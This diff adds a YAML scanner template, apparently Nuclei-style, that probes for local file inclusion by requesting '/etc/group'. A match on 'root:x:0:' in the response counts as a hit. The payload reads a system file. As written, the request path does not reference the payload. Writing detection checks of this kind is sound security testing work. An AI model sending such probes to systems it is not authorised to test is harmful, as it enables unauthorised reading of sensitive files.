@@ -1,0 +1,20 @@
+id: lfi6-0454
+name: 'Traversal in include'
+severity: high
+type: active
+tags:
+  - lfi
+  - traversal
+  - file
+description: 'Reads sensitive file via include'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      include:
+        - '/etc/group'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x:0:'
